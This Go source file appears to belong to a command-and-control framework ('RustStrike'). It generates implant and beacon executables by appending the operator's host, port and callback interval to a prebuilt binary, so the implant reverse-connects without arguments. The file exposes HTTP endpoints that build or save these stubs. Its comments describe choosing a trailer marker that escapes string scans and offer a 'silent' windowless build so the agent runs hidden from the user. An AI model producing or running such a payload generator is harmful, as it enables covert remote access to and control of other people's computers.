package main

// Implant stub patcher: appends a config trailer to a prebuilt implant exe so
// it reverse-connects to a given host:port WITHOUT CLI args. The implant reads
// this trailer at startup (see crates/implant/src/main.rs::read_trailer_config);
// if absent it falls back to args[1]/args[2].
//
// Trailer layout (appended to the exe bytes):
//   <exe bytes>... <padding to align> <TrailerMagic> <host> "\x00" <port> "\x00"
//
// The magic + NUL-delimited fields are binary-safe. The implant reads only the
// last ~256 bytes to find it, so keep the trailer short.

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

// TrailerMagic is the marker the implant searches for near the end of its exe.
// Opaque byte sequence (not a readable word) so it isn't a string-scan
// telltale; must match crates/implant/src/main.rs::TRAILER_MAGIC.
var TrailerMagic = []byte{0x7C, 0x53, 0x9A, 0x2E, 0xD1, 0x04, 0xB8, 0x6F, 0x11, 0xA3}

// PatchImplant returns the base implant/beacon exe bytes with a host:port (and
// optional interval) trailer appended. baseExe is the path to a prebuilt
// ruststrike-implant.exe or ruststrike-beacon.exe.
//
// Trailer layout (appended to the exe bytes):
//
//	<exe bytes>... <TrailerMagic> <host> "\x00" <port> "\x00" [<interval> "\x00"]
//
// The optional `interval` (decimal seconds, non-empty) is the beacon callback
// cadence — only beacons read it; the stock implant stops after port and
// ignores trailing bytes, so appending it is backwards compatible. Pass "" to
// omit (implant trailer, or a beacon that should fall back to its default
// interval).
//
// The magic + NUL-delimited fields are binary-safe. The implant/beacon reads
// only the last ~512 bytes to find it, so keep the trailer short.
func PatchImplant(baseExe, host, port, interval string) ([]byte, error) {
	if host == "" || port == "" {
		return nil, errors.New("host and port required")
	}
	raw, err := os.ReadFile(baseExe)
	if err != nil {
		return nil, fmt.Errorf("read base exe %s: %w", baseExe, err)
	}
	// If the base already has a trailer (e.g. re-patching), strip it first so we
	// don't accumulate trailers.
	raw = stripTrailer(raw)
	out := make([]byte, 0, len(raw)+len(TrailerMagic)+len(host)+len(port)+len(interval)+8)
	out = append(out, raw...)
	out = append(out, TrailerMagic...)
	out = append(out, []byte(host)...)
	out = append(out, 0)
	out = append(out, []byte(port)...)
	out = append(out, 0)
	if interval != "" {
		out = append(out, []byte(interval)...)
		out = append(out, 0)
	}
	return out, nil
}

// stripTrailer removes a trailing trailer (if present) so an exe can be
// re-patched cleanly. Searches the last 512 bytes for the magic.
func stripTrailer(raw []byte) []byte {
	window := 512
	if len(raw) < window {
		window = len(raw)
	}
	tail := raw[len(raw)-window:]
	idx := lastIndex(tail, TrailerMagic)
	if idx < 0 {
		return raw
	}
	// truncate from the magic onward (in the full slice)
	cutAt := len(raw) - window + idx
	return raw[:cutAt]
}

// lastIndex returns the index of the first byte of needle in haystack, or -1.
func lastIndex(haystack, needle []byte) int {
	if len(needle) == 0 || len(needle) > len(haystack) {
		return -1
	}
	for i := 0; i <= len(haystack)-len(needle); i++ {
		match := true
		for j := 0; j < len(needle); j++ {
			if haystack[i+j] != needle[j] {
				match = false
				break
			}
		}
		if match {
			return i
		}
	}
	return -1
}

// variantNames returns the (preferred, silentSibling) candidate exe filenames
// for a stub variant. The stock implant uses ruststrike-implant.exe (+ -silent);
// the beacon uses ruststrike-beacon.exe (+ -silent).
func variantNames(beacon bool) (preferred, silentName string) {
	if beacon {
		return "ruststrike-beacon.exe", "ruststrike-beacon-silent.exe"
	}
	return "ruststrike-implant.exe", "ruststrike-implant-silent.exe"
}

// resolveBaseImplantExe finds the prebuilt base exe: an explicit override env
// var (RUSTSTRIKE_BEACON_EXE for beacons, RUSTSTRIKE_IMPLANT_EXE otherwise),
// else <exe-dir>/<variant>.exe, else a repo-relative path. When `silent` is
// true it prefers the GUI-subsystem silent variant (no console window on
// launch); if that's missing it falls back to the console exe so a build
// without the silent bin still works.
//
// `silent` is applied as a sibling-swap on whatever base was resolved: if the
// resolved base is the console build (ruststrike-implant.exe / -beacon.exe)
// and a -silent sibling sits next to it, the silent sibling wins. An explicit
// override that already points at the silent exe (or a custom name) is left
// untouched.
func resolveBaseImplantExe(silent, beacon bool) (string, error) {
	preferred, silentName := variantNames(beacon)
	// Candidate names in preference order: silent first when requested.
	names := []string{preferred}
	if silent {
		names = []string{silentName, preferred}
	}
	// Explicit override — but honor `silent` by swapping to the silent sibling
	// if the override points at the console exe. The stock implant honors the
	// config Paths.ImplantExe (`baseImplantExe`) as well as its env var; the
	// beacon has no config field, so it uses RUSTSTRIKE_BEACON_EXE only.
	if !beacon && baseImplantExe != "" {
		if _, err := os.Stat(baseImplantExe); err == nil {
			return silentSibling(baseImplantExe, silent, beacon), nil
		}
	}
	override := os.Getenv("RUSTSTRIKE_IMPLANT_EXE")
	if beacon {
		override = os.Getenv("RUSTSTRIKE_BEACON_EXE")
	}
	if override != "" {
		if _, err := os.Stat(override); err == nil {
			return silentSibling(override, silent, beacon), nil
		}
	}
	if exe, err := os.Executable(); err == nil {
		for _, n := range names {
			cand := filepath.Join(filepath.Dir(exe), n)
			if _, err := os.Stat(cand); err == nil {
				return cand, nil
			}
		}
	}
	// repo-relative fallback (core runs from clients/server)
	for _, n := range names {
		cand := filepath.Join("..", "..", "target", "release", n)
		if _, err := os.Stat(cand); err == nil {
			abs, _ := filepath.Abs(cand)
			return abs, nil
		}
	}
	which := "implant"
	if beacon {
		which = "beacon"
	}
	return "", fmt.Errorf("base %s exe not found (set RUSTSTRIKE_%s_EXE)", which, strings.ToUpper(which))
}

// silentSibling returns the path to use for the base exe given a `silent`
// request. If silent is true and `base` is the console exe of the variant
// (ruststrike-implant.exe / ruststrike-beacon.exe) with a -silent sibling, it
// returns the sibling; otherwise `base` unchanged.
func silentSibling(base string, silent, beacon bool) string {
	if !silent {
		return base
	}
	dir := filepath.Dir(base)
	name := filepath.Base(base)
	preferred, silentName := variantNames(beacon)
	if name != preferred {
		return base // custom name or already the silent exe — leave as-is
	}
	sib := filepath.Join(dir, silentName)
	if _, err := os.Stat(sib); err == nil {
		return sib
	}
	return base
}

// stubBuildHandler — POST /api/stub/build body {host, port, silent?, beacon?, interval?} -> {exe_b64}.
//
// `silent` (default false) selects the GUI-subsystem base exe so the deployed
// agent runs with no console window. When true and the silent exe is present,
// the patched stub is windowless; if the silent exe is missing it falls back
// to the console exe (still functional, just not hidden).
//
// `beacon` (default false) selects the beacon base exe (ruststrike-beacon.exe)
// instead of the stock implant — a beacon reconnects forever on a callback
// cadence rather than holding a single persistent channel.
//
// `interval` (decimal seconds, optional) is appended to the trailer as a third
// field so a generated beacon checks in at the operator-chosen cadence with no
// args/env. Only beacons read it; the stock implant ignores trailing trailer
// bytes. Pass "" to omit.
func stubBuildHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Host     string `json:"host"`
		Port     string `json:"port"`
		Silent   bool   `json:"silent"`
		Beacon   bool   `json:"beacon"`
		Interval string `json:"interval"`
	}
	if err := decodeJSONBody(r, &body); err != nil {
		http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
		return
	}
	base, err := resolveBaseImplantExe(body.Silent, body.Beacon)
	if err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}
	// Only a beacon honors the interval; ignore it for the stock implant so a
	// stale value never lands in an implant trailer.
	interval := body.Interval
	if !body.Beacon {
		interval = ""
	}
	patched, err := PatchImplant(base, body.Host, body.Port, interval)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{
		"exe_b64": base64.StdEncoding.EncodeToString(patched),
		"host":    body.Host,
		"port":    body.Port,
		"size":    fmt.Sprintf("%d", len(patched)),
	})
}

// decodeJSONBody is a small helper shared by handlers.
func decodeJSONBody(r *http.Request, v any) error {
	return json.NewDecoder(r.Body).Decode(v)
}

// repoRootFromBaseExe derives the RustStrike repo root from the base implant
// exe path (<repo>/target/release/ruststrike-implant.exe). It walks up from
// the exe's dir looking for a `Cargo.toml` marker (robust to the exe living
// elsewhere via RUSTSTRIKE_IMPLANT_EXE), falling back to three dirs up.
func repoRootFromBaseExe(baseExe string) string {
	dir := filepath.Dir(baseExe)
	for d := dir; d != "" && d != "." && d != filepath.Dir(d); d = filepath.Dir(d) {
		if _, err := os.Stat(filepath.Join(d, "Cargo.toml")); err == nil {
			return d
		}
	}
	// fallback: <repo>/target/release/<exe> -> three dirs up
	return filepath.Dir(filepath.Dir(filepath.Dir(baseExe)))
}

// safeFileName turns an operator-supplied name into something safe for a
// Windows filename (no path separators, no trailing dots/spaces).
func safeFileName(name string) string {
	if name == "" {
		name = "ruststrike-implant"
	}
	name = strings.Map(func(r rune) rune {
		if r < 32 || strings.ContainsRune(`<>:"/\|?*`, r) {
			return '_'
		}
		return r
	}, name)
	name = strings.TrimRight(name, ". ")
	return name
}

// stubSaveHandler — POST /api/stub/save body {host, port, name, silent?, beacon?, interval?} -> {path, exe_b64}.
//
// Writes the patched exe to <repo>/agents/<name>.exe (so a copy lives under
// the project — gitignored via *.exe) AND returns it base64 so the operator
// GUI can trigger a browser download too. The agents/ dir is created on first
// use. `silent` selects the GUI-subsystem base exe (no console window).
// `beacon` selects the beacon base exe; `interval` (decimal seconds, beacon
// only) is baked into the trailer as the callback cadence.
func stubSaveHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Host     string `json:"host"`
		Port     string `json:"port"`
		Name     string `json:"name"`
		Silent   bool   `json:"silent"`
		Beacon   bool   `json:"beacon"`
		Interval string `json:"interval"`
	}
	if err := decodeJSONBody(r, &body); err != nil {
		http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
		return
	}
	base, err := resolveBaseImplantExe(body.Silent, body.Beacon)
	if err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}
	interval := body.Interval
	if !body.Beacon {
		interval = ""
	}
	patched, err := PatchImplant(base, body.Host, body.Port, interval)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	agentsDir := filepath.Join(repoRootFromBaseExe(base), "agents")
	if err := os.MkdirAll(agentsDir, 0o755); err != nil {
		http.Error(w, "create agents dir: "+err.Error(), http.StatusInternalServerError)
		return
	}
	fname := safeFileName(body.Name)
	if !strings.HasSuffix(strings.ToLower(fname), ".exe") {
		fname += ".exe"
	}
	outPath := filepath.Join(agentsDir, fname)
	if err := os.WriteFile(outPath, patched, 0o644); err != nil {
		http.Error(w, "write stub: "+err.Error(), http.StatusInternalServerError)
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{
		"path":    outPath,
		"exe_b64": base64.StdEncoding.EncodeToString(patched),
		"host":    body.Host,
		"port":    body.Port,
		"size":    fmt.Sprintf("%d", len(patched)),
	})
}
